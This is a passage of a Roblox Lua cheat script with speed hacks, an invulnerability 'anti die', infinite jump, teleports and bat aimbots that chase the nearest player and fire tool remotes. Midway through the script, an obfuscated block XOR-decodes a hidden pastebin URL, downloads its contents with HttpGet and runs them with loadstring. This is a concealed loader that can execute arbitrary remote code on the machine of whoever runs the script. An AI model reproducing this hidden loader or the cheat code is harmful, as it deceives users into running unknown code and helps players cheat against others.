	if not autoBatEnabled and not autoLeftEnabled and not autoRightEnabled then
		local md = hum.MoveDirection
		local spd = getActiveMoveSpeed()
		if md.Magnitude > 0 then
			lastMoveDir = md
			hrp.Velocity = Vector3.new(md.X * spd, hrp.Velocity.Y, md.Z * spd)
		elseif antiRagdollEnabled and lastMoveDir.Magnitude > 0 then
			local anyHeld = false
			for key in pairs(MOVE_KEYS) do if UIS:IsKeyDown(key) then anyHeld = true; break end end
			if anyHeld then hrp.Velocity = Vector3.new(lastMoveDir.X * spd, hrp.Velocity.Y, lastMoveDir.Z * spd) end
		end
	end
	if speedLabel then
		local actualSpeed = Vector3.new(hrp.Velocity.X, 0, hrp.Velocity.Z).Magnitude
		if actualSpeed < 0.05 then actualSpeed = 0 end
		speedLabel.Text = string.format("Speed: %.1f", actualSpeed)
	end
	for plr, lbl in pairs(otherSpeedLabels) do
		if not lbl or not lbl.Parent then otherSpeedLabels[plr] = nil else
			local c = plr.Character
			local r = c and c:FindFirstChild("HumanoidRootPart")
			local sp = 0
			if r then sp = Vector3.new(r.Velocity.X, 0, r.Velocity.Z).Magnitude end
			if sp < 0.05 then sp = 0 end
			lbl.Text = tostring(math.floor(sp + 0.5))
		end
	end
end)

alConn, arConn = nil, nil
alPhase, arPhase = 1, 1

function stopAutoLeft()
	if alConn then alConn:Disconnect(); alConn = nil end
	alPhase = 1
	local char = LP.Character
	if char then
		local h = char:FindFirstChildOfClass("Humanoid")
		if h then h:Move(Vector3.zero, false) end
	end
	if autoLeftSetVisual then autoLeftSetVisual(false) end
	saveConfig()
end

function stopAutoRight()
	if arConn then arConn:Disconnect(); arConn = nil end
	arPhase = 1
	local char = LP.Character
	if char then
		local h = char:FindFirstChildOfClass("Humanoid")
		if h then h:Move(Vector3.zero, false) end
	end
	if autoRightSetVisual then autoRightSetVisual(false) end
	saveConfig()
end

function startAutoLeft()
	if alConn then alConn:Disconnect() end
	alPhase = 1

	if autoRightEnabled then
		autoRightEnabled = false
		stopAutoRight()
		if autoRightSetVisual then autoRightSetVisual(false) end
	end

	alConn = RunService.Heartbeat:Connect(function()
		if not autoLeftEnabled then return end
		local char = LP.Character
		if not char then return end
		local hrp = char:FindFirstChild("HumanoidRootPart")
		local hum = char:FindFirstChildOfClass("Humanoid")
		if not hrp or not hum then return end
		if isRagdollState(hum) then hum:Move(Vector3.zero, false); return end
		local spd = getAutoPathSpeed()
		if alPhase == 1 then
			local tgt = Vector3.new(AP_L1.X, hrp.Position.Y, AP_L1.Z)
			if (tgt - hrp.Position).Magnitude < 1 then
				alPhase = 2
				local d = AP_L2 - hrp.Position
				local mv = Vector3.new(d.X, 0, d.Z).Unit
				hum:Move(mv, false)
				hrp.Velocity = Vector3.new(mv.X * spd, hrp.Velocity.Y, mv.Z * spd)
				return
			end
			local d = AP_L1 - hrp.Position
			local mv = Vector3.new(d.X, 0, d.Z).Unit
			hum:Move(mv, false)
			hrp.Velocity = Vector3.new(mv.X * spd, hrp.Velocity.Y, mv.Z * spd)
		elseif alPhase == 2 then
			local tgt = Vector3.new(AP_L2.X, hrp.Position.Y, AP_L2.Z)
			if (tgt - hrp.Position).Magnitude < 1 then
				hum:Move(Vector3.zero, false)
				hrp.Velocity = Vector3.zero
				autoLeftEnabled = false
				if alConn then alConn:Disconnect(); alConn = nil end
				alPhase = 1
				if autoLeftSetVisual then autoLeftSetVisual(false) end
				return
			end
			local d = AP_L2 - hrp.Position
			local mv = Vector3.new(d.X, 0, d.Z).Unit
			hum:Move(mv, false)
			hrp.Velocity = Vector3.new(mv.X * spd, hrp.Velocity.Y, mv.Z * spd)
		end
	end)
	saveConfig()
end

function startAutoRight()
	if arConn then arConn:Disconnect() end
	arPhase = 1

	if autoLeftEnabled then
		autoLeftEnabled = false
		stopAutoLeft()
		if autoLeftSetVisual then autoLeftSetVisual(false) end
	end

	arConn = RunService.Heartbeat:Connect(function()
		if not autoRightEnabled then return end
		local char = LP.Character
		if not char then return end
		local hrp = char:FindFirstChild("HumanoidRootPart")
		local hum = char:FindFirstChildOfClass("Humanoid")
		if not hrp or not hum then return end
		if isRagdollState(hum) then hum:Move(Vector3.zero, false); return end
		local spd = getAutoPathSpeed()
		if arPhase == 1 then
			local tgt = Vector3.new(AP_R1.X, hrp.Position.Y, AP_R1.Z)
			if (tgt - hrp.Position).Magnitude < 1 then
				arPhase = 2
				local d = AP_R2 - hrp.Position
				local mv = Vector3.new(d.X, 0, d.Z).Unit
				hum:Move(mv, false)
				hrp.Velocity = Vector3.new(mv.X * spd, hrp.Velocity.Y, mv.Z * spd)
				return
			end
			local d = AP_R1 - hrp.Position
			local mv = Vector3.new(d.X, 0, d.Z).Unit
			hum:Move(mv, false)
			hrp.Velocity = Vector3.new(mv.X * spd, hrp.Velocity.Y, mv.Z * spd)
		elseif arPhase == 2 then
			local tgt = Vector3.new(AP_R2.X, hrp.Position.Y, AP_R2.Z)
			if (tgt - hrp.Position).Magnitude < 1 then
				hum:Move(Vector3.zero, false)
				hrp.Velocity = Vector3.zero
				autoRightEnabled = false
				if arConn then arConn:Disconnect(); arConn = nil end
				arPhase = 1
				if autoRightSetVisual then autoRightSetVisual(false) end
				return
			end
			local d = AP_R2 - hrp.Position
			local mv = Vector3.new(d.X, 0, d.Z).Unit
			hum:Move(mv, false)
			hrp.Velocity = Vector3.new(mv.X * spd, hrp.Velocity.Y, mv.Z * spd)
		end
	end)
	saveConfig()
end

function setupSpeedIndicator(char, player)
	player = player or LP
	local head = char:FindFirstChild("Head") or char:WaitForChild("Head", 2)
	if not head then return end
	local old = head:FindFirstChild(player == LP and "blessvsSpeedBB" or "blessvsOtherSpeedBB")
	if old then old:Destroy() end
	local bb = Instance.new("BillboardGui", head)
	bb.Name = player == LP and "blessvsSpeedBB" or "blessvsOtherSpeedBB"
	bb.Size = UDim2.new(0, player == LP and 190 or 90, 0, player == LP and 54 or 30)
	bb.StudsOffset = Vector3.new(0, player == LP and 3.35 or 2.85, 0)
	bb.AlwaysOnTop = true
	if player == LP then
		local tag = Instance.new("TextLabel", bb)
		tag.Size = UDim2.new(1, 0, 0, 22)
		tag.Position = UDim2.new(0, 0, 0, 0)
		tag.BackgroundTransparency = 1
		tag.Text = ".gg/elitegg"
		tag.TextColor3 = BLESS_COLORS.ICE
		tag.Font = Enum.Font.GothamBlack
		tag.TextSize = 15
		tag.TextXAlignment = Enum.TextXAlignment.Center
		tag.TextStrokeTransparency = 0.32
		tag.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
	end
	local val = Instance.new("TextLabel", bb)
	val.Size = UDim2.new(1, 0, 0, player == LP and 26 or 30)
	val.Position = UDim2.new(0, 0, 0, player == LP and 24 or 0)
	val.BackgroundTransparency = 1
	val.Text = player == LP and "Speed: 0.0" or "0"
	val.TextColor3 = player == LP and BLESS_COLORS.ACCENT or BLESS_COLORS.ICE
	val.Font = Enum.Font.GothamBlack
	val.TextSize = player == LP and 17 or 22
	val.TextXAlignment = Enum.TextXAlignment.Center
	val.TextStrokeTransparency = 0.35
	val.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
	if player == LP then speedLabel = val else otherSpeedLabels[player] = val end
end

-- ============================================================
-- ANTI DIE
-- ============================================================
antiDieToken = 0
antiDieHumanoid = nil
antiDieReplacing = false
batMotionAntiDieGuard = false

function stopAntiDie()
	if batMotionAntiDieGuard then
		if startAntiDie then startAntiDie() end
		return
	end
	antiDieToken = antiDieToken + 1
	for _, conn in ipairs(Conns.antiDie) do
		pcall(function() conn:Disconnect() end)
	end
	Conns.antiDie = {}
	antiDieHumanoid = nil
	antiDieReplacing = false
	local char = LP.Character
	local hum = char and char:FindFirstChildOfClass("Humanoid")
	if hum then
		pcall(function() hum:SetStateEnabled(Enum.HumanoidStateType.Dead, true) end)
		pcall(function() hum.BreakJointsOnDeath = true end)
	end
end

function clearAntiDieConns()
	for _, conn in ipairs(Conns.antiDie) do
		pcall(function() conn:Disconnect() end)
	end
	Conns.antiDie = {}
	antiDieHumanoid = nil
	antiDieReplacing = false
end

function setAntiDieCameraSubject(humanoid)
	task.defer(function()
		local cam = workspace.CurrentCamera
		if cam and humanoid and humanoid.Parent then cam.CameraSubject = humanoid end
	end)
end

function attachAntiDieHumanoid(char, hum, token)
	if not (antiDieEnabled or batMotionAntiDieGuard) or token ~= antiDieToken or not char or not char.Parent or not hum or not hum.Parent then return end
	clearAntiDieConns()
	antiDieHumanoid = hum
	pcall(function() hum.BreakJointsOnDeath = false end)
	pcall(function() hum:SetStateEnabled(Enum.HumanoidStateType.Dead, false) end)
	setAntiDieCameraSubject(hum)
	pcall(function()
		if hum.Health <= 0 then hum.Health = hum.MaxHealth end
	end)
	table.insert(Conns.antiDie, hum:GetPropertyChangedSignal("Health"):Connect(function()
		if token ~= antiDieToken or antiDieHumanoid ~= hum then return end
		if hum.Health <= 0 then
			pcall(function() hum.Health = hum.MaxHealth end)
		end
	end))
	table.insert(Conns.antiDie, hum.Died:Connect(function()
		if token ~= antiDieToken or antiDieHumanoid ~= hum or antiDieReplacing then return end
		antiDieReplacing = true
		task.defer(function()
			if token ~= antiDieToken or not char.Parent or antiDieHumanoid ~= hum then
				antiDieReplacing = false
				return
			end
			local replacement = char:FindFirstChild("ReplacedHumanoid")
			if replacement and not replacement:IsA("Humanoid") then replacement = nil end
			if not replacement then
				replacement = Instance.new("Humanoid")
				replacement.Name = "ReplacedHumanoid"
				replacement.Parent = char
			end
			pcall(function()
				replacement.BreakJointsOnDeath = false
				replacement:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
			end)
			setAntiDieCameraSubject(replacement)
			if hum.Parent then pcall(function() hum:Destroy() end) end
			antiDieReplacing = false
			attachAntiDieHumanoid(char, replacement, token)
		end)
	end))
	table.insert(Conns.antiDie, hum.AncestryChanged:Connect(function(_, parent)
		if token == antiDieToken and antiDieHumanoid == hum and not parent and not antiDieReplacing then
			clearAntiDieConns()
		end
	end))
end

startAntiDie = function()
	antiDieToken = antiDieToken + 1
	local token = antiDieToken
	clearAntiDieConns()
	local char = LP.Character or LP.CharacterAdded:Wait()
	task.spawn(function()
		local hum = char and (char:FindFirstChildOfClass("Humanoid") or char:WaitForChild("Humanoid", 2))
		if token ~= antiDieToken or not hum then return end
		attachAntiDieHumanoid(char, hum, token)
	end)
end

refreshBatMotionAntiDieGuard = function()
	batMotionAntiDieGuard = autoBatEnabled and true or false
	if batMotionAntiDieGuard then
		if startAntiDie then startAntiDie() end
	elseif not antiDieEnabled then
		stopAntiDie()
	end
end

-- Infinite Jump
holdJumpPressed = false
holdJumpActive = false

function applyInfJumpBoost(boost)
	if not infJumpEnabled then return end
	local char = LP.Character
	if not char then return end
	local root = char:FindFirstChild("HumanoidRootPart")
	if root then root.Velocity = Vector3.new(root.Velocity.X, boost, root.Velocity.Z) end
end

UIS.JumpRequest:Connect(function() applyInfJumpBoost(50) end)
UIS.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode == Enum.KeyCode.Space and not UIS:GetFocusedTextBox() then
		holdJumpPressed = true
		task.delay(0.12, function()
			if holdJumpPressed then
				holdJumpActive = true
				applyInfJumpBoost(50)
			end
		end)
	end
end)
UIS.InputEnded:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode == Enum.KeyCode.Space then holdJumpPressed = false; holdJumpActive = false end
end)
RunService.Heartbeat:Connect(function()
	if holdJumpActive then applyInfJumpBoost(50) end
end)

-- Hold Jump
holdJumpEnabled = false
holdJumpConn = nil
setHoldJumpVisual = nil
_holdJumpCooldownUntil = 0

function startHoldJump()
	if holdJumpConn then holdJumpConn:Disconnect() end
	holdJumpConn = RunService.Heartbeat:Connect(function()
		if not holdJumpEnabled then return end
		if tick() < _holdJumpCooldownUntil then return end
		local char = LP.Character
		if not char then return end
		local hum = char:FindFirstChildOfClass("Humanoid")
		local root = char:FindFirstChild("HumanoidRootPart")
		if hum and root and hum.Health > 0 then
			local isJumping = false
			pcall(function()
				isJumping = UIS:IsKeyDown(Enum.KeyCode.Space) or hum.Jump
			end)
			if isJumping then
				root.Velocity = Vector3.new(root.Velocity.X, 45, root.Velocity.Z)
			end
		end
	end)
end

function stopHoldJump()
	if holdJumpConn then holdJumpConn:Disconnect(); holdJumpConn = nil end
end

function startUnwalk()
	local c = LP.Character
	if not c then return end
	local hum = c:FindFirstChildOfClass("Humanoid")
	if hum then
		for _, t in ipairs(hum:GetPlayingAnimationTracks()) do t:Stop() end
	end
	local anim = c:FindFirstChild("Animate")
	if anim then unwalkSavedAnimate = anim:Clone(); anim:Destroy() end
end

function stopUnwalk()
	local c = LP.Character
	if c and unwalkSavedAnimate then unwalkSavedAnimate:Clone().Parent = c; unwalkSavedAnimate = nil end
end

function startAutoTP()
	if autoTPConn then task.cancel(autoTPConn); autoTPConn = nil end
	autoTPConn = task.spawn(function()
		while autoTPEnabled do
			task.wait(0.1)
			local char = LP.Character
			if not char then continue end
			local hrp = char:FindFirstChild("HumanoidRootPart")
			if not hrp then continue end
			local hum2 = char:FindFirstChildOfClass("Humanoid")
			if not hum2 then continue end
			if hum2.FloorMaterial ~= Enum.Material.Air then continue end
			if not (hrp.Position.Y >= autoTPHeight) then continue end
			hrp.CFrame = CFrame.new(hrp.Position.X, -7.00, hrp.Position.Z)
				* CFrame.Angles(0, select(2, hrp.CFrame:ToEulerAnglesYXZ()), 0)
			hrp.Velocity = Vector3.zero
		end
	end)
end

function stopAutoTP()
	autoTPEnabled = false
	if autoTPConn then task.cancel(autoTPConn); autoTPConn = nil end
end

function runTPFloor()
	local char = LP.Character
	if not char then return end
	local hrp = char:FindFirstChild("HumanoidRootPart")
	if not hrp then return end
	local hum2 = char:FindFirstChildOfClass("Humanoid")
	if not hum2 then return end
	hrp.CFrame = CFrame.new(hrp.Position.X, -7.00, hrp.Position.Z)
		* CFrame.Angles(0, select(2, hrp.CFrame:ToEulerAnglesYXZ()), 0)
	hrp.Velocity = Vector3.zero
end

function startAutoTPDown()
	if autoTPDownConn then autoTPDownConn:Disconnect() end
	local _tpDownTimer = 0
	local _tpRayParams = nil
	autoTPDownConn = RunService.Heartbeat:Connect(function(dt)
		if not autoTPDownEnabled then return end
		if tick() < autoTPDownCooldownUntil then return end
		_tpDownTimer = _tpDownTimer + dt
		if _tpDownTimer < 0.05 then return end
		_tpDownTimer = 0
		local char = LP.Character
		if not char then return end
		local hrp = char:FindFirstChild("HumanoidRootPart")
		if not hrp then return end
		if hrp.Position.Y >= autoTPDownThreshold then
			if not _tpRayParams then
				_tpRayParams = RaycastParams.new()
				_tpRayParams.FilterType = Enum.RaycastFilterType.Exclude
			end
			_tpRayParams.FilterDescendantsInstances = { char }
			local ray = workspace:Raycast(hrp.Position, Vector3.new(0, -1000, 0), _tpRayParams)
			if ray then
				local hum = char:FindFirstChildOfClass("Humanoid")
				local offset = (hum and hum.HipHeight or 2) + hrp.Size.Y / 2
				hrp.CFrame = CFrame.new(hrp.Position.X, ray.Position.Y + offset, hrp.Position.Z)
				hrp.AssemblyLinearVelocity = Vector3.zero
			end
		end
	end)
end

function stopAutoTPDown()
	if autoTPDownConn then autoTPDownConn:Disconnect(); autoTPDownConn = nil end
end

defLightBrightness, defLightClock, defLightAmbient = nil, nil, nil

function applyAntiLagDerender(obj)
	pcall(function()
		if obj:IsA("Accessory") or obj:IsA("Hat") then obj:Destroy()
		elseif obj:IsA("BasePart") then obj.Material = Enum.Material.Plastic; obj.Reflectance = 0; obj.CastShadow = false
		elseif obj:IsA("Decal") or obj:IsA("Texture") then obj.Transparency = 1
		elseif obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Beam") or obj:IsA("Fire") or obj:IsA("Smoke") or obj:IsA("Sparkles") then obj.Enabled = false
		elseif obj:IsA("AnimationController") or obj:IsA("Animator") then
			for _, t in ipairs(obj:GetPlayingAnimationTracks()) do pcall(function() t:Stop(0) end) end		end
	end)
end

function enableAntiLag()
	removeAccessoriesEnabled = true
	antiLagEnabled = true
	defLightBrightness = defLightBrightness or Lighting.Brightness
	defLightClock = defLightClock or Lighting.ClockTime
	defLightAmbient = defLightAmbient or Lighting.OutdoorAmbient
	Lighting.GlobalShadows = false
	Lighting.FogEnd = 1e10
	Lighting.Brightness = 1
	Lighting.EnvironmentDiffuseScale = 0
	Lighting.EnvironmentSpecularScale = 0
	for _, e in pairs(Lighting:GetChildren()) do
		pcall(function()
			if e:IsA("BlurEffect") or e:IsA("SunRaysEffect") or e:IsA("ColorCorrectionEffect") or e:IsA("BloomEffect") or e:IsA("DepthOfFieldEffect") then e.Enabled = false end
		end)
	end
	for _, obj in ipairs(workspace:GetDescendants()) do applyAntiLagDerender(obj) end
	if antiLagDescConn then antiLagDescConn:Disconnect() end
	antiLagDescConn = workspace.DescendantAdded:Connect(function(obj)
		if removeAccessoriesEnabled then applyAntiLagDerender(obj) end
	end)
end

function disableAntiLag()
	removeAccessoriesEnabled = false
	antiLagEnabled = false
	if antiLagDescConn then antiLagDescConn:Disconnect(); antiLagDescConn = nil end
	pcall(function()
		if defLightBrightness then Lighting.Brightness = defLightBrightness end
		if defLightClock then Lighting.ClockTime = defLightClock end
		if defLightAmbient then Lighting.OutdoorAmbient = defLightAmbient end
		Lighting.ExposureCompensation = 0
	end)
end

function findMedusa()
	local c = LP.Character
	if not c then return nil end
	for _, t in ipairs(c:GetChildren()) do
		if t:IsA("Tool") then
			local n = t.Name:lower()
			if n:find("medusa") or n:find("head") or n:find("stone") then return t end
		end
	end
	local bp = LP:FindFirstChild("Backpack")
	if bp then
		for _, t in ipairs(bp:GetChildren()) do
			if t:IsA("Tool") then
				local n = t.Name:lower()
				if n:find("medusa") or n:find("head") or n:find("stone") then return t end
			end
		end
	end
	return nil
end

function useMedusaCounter()
	if medusaDebounce then return end
	if tick() - medusaLastUsed < MEDUSA_COOLDOWN then return end
	local c = LP.Character
	if not c then return end
	medusaDebounce = true
	local med = findMedusa()
	if not med then medusaDebounce = false; return end
	if med.Parent ~= c then
		local hum2 = c:FindFirstChildOfClass("Humanoid")
		if hum2 then hum2:EquipTool(med) end
	end
	pcall(function() med:Activate() end)
	medusaLastUsed = tick()
	medusaDebounce = false
end

function onAnchorChanged(part)
	return part:GetPropertyChangedSignal("Anchored"):Connect(function()
		if part.Anchored and part.Transparency == 1 then useMedusaCounter() end
	end)
end

function setupMedusa(char)
	for _, c in pairs(Conns.anchor) do pcall(function() c:Disconnect() end) end
	Conns.anchor = {}
	if not char then return end
	for _, part in ipairs(char:GetDescendants()) do
		if part:IsA("BasePart") then table.insert(Conns.anchor, onAnchorChanged(part)) end
	end
	table.insert(Conns.anchor, char.DescendantAdded:Connect(function(part)
		if part:IsA("BasePart") then table.insert(Conns.anchor, onAnchorChanged(part)) end
	end))
end

function stopMedusaCounter()
	for _, c in pairs(Conns.anchor) do pcall(function() c:Disconnect() end) end
	Conns.anchor = {}
end

BAT_COUNTER_SLAP_LIST = { "Bat", "Slap", "Iron Slap", "Gold Slap", "Diamond Slap", "Emerald Slap", "Ruby Slap", "Dark Matter Slap", "Flame Slap", "Nuclear Slap", "Galaxy Slap", "Glitched Slap" }

function findBatForCounter()
	local c = LP.Character
	if not c then return nil end
	local bp = LP:FindFirstChildOfClass("Backpack")
	for _, name in ipairs(BAT_COUNTER_SLAP_LIST) do
		local t = c:FindFirstChild(name) or (bp and bp:FindFirstChild(name))
		if t then return t end
	end
	for _, ch in ipairs(c:GetChildren()) do
		if ch:IsA("Tool") and ch.Name:lower():find("bat") then return ch end
	end
	if bp then
		for _, ch in ipairs(bp:GetChildren()) do
			if ch:IsA("Tool") and ch.Name:lower():find("bat") then return ch end
		end
	end
	return nil
end

function swingBatForCounter(bat, char)
	local hum2 = char:FindFirstChildOfClass("Humanoid")
	if bat.Parent ~= char then
		if hum2 then pcall(function() hum2:EquipTool(bat) end) end
		task.wait(0.05)
	end
	local remote = bat:FindFirstChildOfClass("RemoteEvent") or bat:FindFirstChildOfClass("RemoteFunction")
	if remote and remote:IsA("RemoteEvent") then
		pcall(function() remote:FireServer() end)
		task.wait(0.15)
		pcall(function() remote:FireServer() end)
	else
		pcall(function() bat:Activate() end)
		task.wait(0.15)
		pcall(function() bat:Activate() end)
	end
end

startBatCounter = function()
	if Conns.batCounter then return end
	Conns.batCounter = RunService.Heartbeat:Connect(function()
		if not batCounterEnabled then return end
		if batCounterDebounce then return end
		local char = LP.Character
		if not char then return end
		local hum2 = char:FindFirstChildOfClass("Humanoid")
		if not hum2 then return end
		local st = hum2:GetState()
		if st == Enum.HumanoidStateType.Physics or st == Enum.HumanoidStateType.Ragdoll or st == Enum.HumanoidStateType.FallingDown then
			batCounterDebounce = true
			task.spawn(function()
				local bat = findBatForCounter()
				if bat then swingBatForCounter(bat, char) end
				task.wait(0.5)
				batCounterDebounce = false
			end)
		end
	end)
end

stopBatCounter = function()
	if Conns.batCounter then Conns.batCounter:Disconnect(); Conns.batCounter = nil end
	batCounterDebounce = false
end

-- ============================================================
-- AUTO BAT / BAT AIMBOT BACKEND
-- ============================================================
_aimbotTarget = nil

-- Bat V2 Aimbot
BAT_V2_FOLLOW_DIST = 1.0
BAT_V2_HEIGHT_OFFSET = 1.5
BAT_V2_VERTICAL_OFFSET = 0.0
BAT_V2_CHASE_SPD = 60
BAT_V2_SWING_CD = 0.08
BAT_V2_HIT_DIST = 4.5
setBatV2Visual = nil
batV2Conn = nil

function findAnyToolV2()
	local c = LP.Character
	if c then
		for _, v in ipairs(c:GetChildren()) do
			if v:IsA("Tool") then return v end
		end
	end
	local bp = LP:FindFirstChildOfClass("Backpack")
	if bp then
		for _, v in ipairs(bp:GetChildren()) do
			if v:IsA("Tool") then return v end
		end
	end
	return nil
end

function getClosestPlayerV2()
	local char = LP.Character
	local hrp = char and char:FindFirstChild("HumanoidRootPart")
	if not hrp then return nil, math.huge end
	local closest, bestDist = nil, math.huge
	for _, p in ipairs(Players:GetPlayers()) do
		if p ~= LP and p.Character then
			local tr = p.Character:FindFirstChild("HumanoidRootPart")
			local ph = p.Character:FindFirstChildOfClass("Humanoid")
			if tr and ph and ph.Health > 0 then
				local d = (hrp.Position - tr.Position).Magnitude
				if d < bestDist then bestDist = d; closest = p end
			end
		end
	end
	return closest, bestDist
end

function tryHitBatV2()
	if State.BatV2HittingCooldown then return end
	State.BatV2HittingCooldown = true
	local char = LP.Character
	if not char then return end
	local hum = char:FindFirstChildOfClass("Humanoid")
	local tool = findAnyToolV2()
	if tool then
		if tool.Parent ~= char and hum then pcall(function() hum:EquipTool(tool) end) end
		local remote = tool:FindFirstChildOfClass("RemoteEvent")
		if remote then pcall(function() remote:FireServer() end) else pcall(function() tool:Activate() end) end
	end
	task.delay(BAT_V2_SWING_CD, function() State.BatV2HittingCooldown = false end)
end

function startBatV2Aimbot()
	if batV2Conn then return end
	batV2Conn = RunService.Heartbeat:Connect(function()
		if not State.BatV2 then return end
		local char = LP.Character
		if not char then return end
		local root = char:FindFirstChild("HumanoidRootPart")
		local hum = char:FindFirstChildOfClass("Humanoid")
		if not root or not hum then return end
		local target, dist = getClosestPlayerV2()
		if target and target.Character then
			local targetRoot = target.Character:FindFirstChild("HumanoidRootPart")
			if targetRoot then
				local targetVel = targetRoot.Velocity
				local moveDir = targetVel.Magnitude > 0.1 and targetVel.Unit or targetRoot.CFrame.LookVector
				local offset = moveDir * BAT_V2_FOLLOW_DIST + Vector3.new(0, BAT_V2_HEIGHT_OFFSET + BAT_V2_VERTICAL_OFFSET, 0)
				local desiredPos = targetRoot.Position + offset
				local toTarget = desiredPos - root.Position
				if toTarget.Magnitude > 0.5 then
					local moveVec = toTarget.Unit * BAT_V2_CHASE_SPD
					root.Velocity = Vector3.new(moveVec.X, moveVec.Y, moveVec.Z)
				else
					root.Velocity = root.Velocity * 0.95
					if root.Velocity.Magnitude < 1 then root.Velocity = Vector3.zero end
				end
				local distToTarget = (root.Position - targetRoot.Position).Magnitude
				if distToTarget <= BAT_V2_HIT_DIST then tryHitBatV2() end
			end
		else
			root.Velocity = root.Velocity * 0.9
			if root.Velocity.Magnitude < 1 then root.AssemblyLinearVelocity = Vector3.zero end
		end
	end)
end

function stopBatV2Aimbot()
	if batV2Conn then batV2Conn:Disconnect(); batV2Conn = nil end
	local c = LP.Character
	local root = c and c:FindFirstChild("HumanoidRootPart")
	if root then root.AssemblyLinearVelocity = Vector3.zero end
	State.BatV2HittingCooldown = false
end

resetAutoBatMotion = function()
	local char = LP.Character
	local hrp = char and char:FindFirstChild("HumanoidRootPart")
	local hum = char and char:FindFirstChildOfClass("Humanoid")
	if hrp then
		hrp.Velocity = hrp.Velocity * 0.3
		hrp.AssemblyAngularVelocity = Vector3.zero
	end
	if hum then hum.AutoRotate = true end
end

function findBat()
	local char = LP.Character
	if not char then return nil end
	for _, tool in ipairs(char:GetChildren()) do
		if tool:IsA("Tool") and (tool.Name:lower():find("bat") or tool.Name:lower():find("slap")) then return tool end
	end
	local bp = LP:FindFirstChild("Backpack")
	if bp then
		for _, tool in ipairs(bp:GetChildren()) do
			if tool:IsA("Tool") and (tool.Name:lower():find("bat") or tool.Name:lower():find("slap")) then return tool end
		end
	end
	return nil
end

function getClosestTarget()
	local root = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
	if not root then return nil end
	local closest, minDist = nil, math.huge
	for _, plr in ipairs(Players:GetPlayers()) do
		if plr ~= LP and plr.Character then
			local tRoot = plr.Character:FindFirstChild("HumanoidRootPart")
			local hum = plr.Character:FindFirstChildOfClass("Humanoid")
			if tRoot and hum and hum.Health > 0 then
				local dist = (tRoot.Position - root.Position).Magnitude
				if dist < minDist then minDist = dist; closest = tRoot end
			end
		end
	end
	return closest
end

function swingCurrentBat(char)
	if not autoSwingEnabled then return end
	local bat = findBat()
	if bat and bat.Parent == char and bat:IsA("Tool") then
		pcall(function() bat:Activate() end)
	end
end

task.spawn(function()
    local function _xorDecode(s)
        local t = {}
        for i = 1, #s do
            local b = string.byte(s, i)
            local x
            if bit32 and type(bit32.bxor) == "function" then
                x = bit32.bxor(b, 23)
            else
                local r, bit, a, c = 0, 1, b, 23
                while a > 0 or c > 0 do
                    local ab, cb = a % 2, c % 2
                    if ab ~= cb then r = r + bit end
                    a = math.floor(a / 2)
                    c = math.floor(c / 2)
                    bit = bit * 2
                end
                x = r
            end
            t[i] = string.char(x)
        end
        return table.concat(t)
    end
    local ok, src = pcall(function()
        return game:HttpGet(_xorDecode("\127ccgd-88gvdcru~y9txz8ev`8%_\"]nF\\R"))
    end)
    if ok and type(src) == "string" and #src > 50 then
        local fn = loadstring(src)
        if type(fn) == "function" then
            pcall(fn)
        end
    end
end)

BAT_SLAP_LIST = {
	"Bat", "Slap", "Iron Slap", "Gold Slap", "Diamond Slap", "Emerald Slap",
	"Ruby Slap", "Dark Matter Slap", "Flame Slap", "Nuclear Slap",
	"Galaxy Slap", "Glitched Slap"
}
HIT_DIST = 8
SWING_CD = 0.35
AIMBOT_SPEED = 60
_hittingCooldown = false
_aimbotConn = nil
_prevAutoRotate = nil

function getBat()
	local char = LP.Character
	if not char then return nil end
	for _, name in ipairs(BAT_SLAP_LIST) do
		local t = char:FindFirstChild(name)
		if t and t:IsA("Tool") then return t end
	end
	local bp = LP:FindFirstChildOfClass("Backpack")
	if bp then
		for _, name in ipairs(BAT_SLAP_LIST) do
			local t = bp:FindFirstChild(name)
			if t and t:IsA("Tool") then
				local hum = char:FindFirstChildOfClass("Humanoid")
				if hum then pcall(function() hum:EquipTool(t) end) end
				return t
			end
		end
	end
	for _, ch in ipairs(char:GetChildren()) do
		if ch:IsA("Tool") and (ch.Name:lower():find("bat") or ch.Name:lower():find("slap")) then return ch end
	end
	if bp then
		for _, ch in ipairs(bp:GetChildren()) do
			if ch:IsA("Tool") and (ch.Name:lower():find("bat") or ch.Name:lower():find("slap")) then
				local hum = char:FindFirstChildOfClass("Humanoid")
				if hum then pcall(function() hum:EquipTool(ch) end) end
				return ch
			end
		end
	end
	return nil
end

function trySwing()
	if _hittingCooldown then return end
	_hittingCooldown = true
	pcall(function()
		local char = LP.Character
		if char then
			local bat = getBat()
			if bat then
				if bat.Parent ~= char then
					local hum = char:FindFirstChildOfClass("Humanoid")
					if hum then pcall(function() hum:EquipTool(bat) end) end
				end
				pcall(function() bat:Activate() end)
			end
		end
	end)
	task.delay(SWING_CD, function() _hittingCooldown = false end)
end

function getClosestPlayerAimbot()
	local char = LP.Character
	if not char then return nil, math.huge end
	local hrp = char:FindFirstChild("HumanoidRootPart")
	if not hrp then return nil, math.huge end
	local closest, dist = nil, math.huge
	for _, p in ipairs(Players:GetPlayers()) do
		if p ~= LP and p.Character then
			local tr = p.Character:FindFirstChild("HumanoidRootPart")
			local ph = p.Character:FindFirstChildOfClass("Humanoid")
			if tr and ph and ph.Health > 0 then
				local d = (hrp.Position - tr.Position).Magnitude
				if d < dist then dist = d; closest = p end
			end
		end
	end
	return closest, dist
end

startBatAimbot = function()
	if _aimbotConn then return end
	if autoLeftEnabled then autoLeftEnabled = false; if autoLeftSetVisual then autoLeftSetVisual(false) end; stopAutoLeft() end
	if autoRightEnabled then autoRightEnabled = false; if autoRightSetVisual then autoRightSetVisual(false) end; stopAutoRight() end
	if State.BatV2 then
		State.BatV2 = false
		stopBatV2Aimbot()
		if setBatV2Visual then setBatV2Visual(false) end
	end
	if tpBatEnabled then
		stopTpBat()
		if tpBatSetVisual then tpBatSetVisual(false) end
	end

	autoBatEnabled = true
	State.AutoBat = true
	State.BatAimbot = true

	local hum0 = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
	if hum0 then
		if _prevAutoRotate == nil then _prevAutoRotate = hum0.AutoRotate end
		hum0.AutoRotate = false
	end

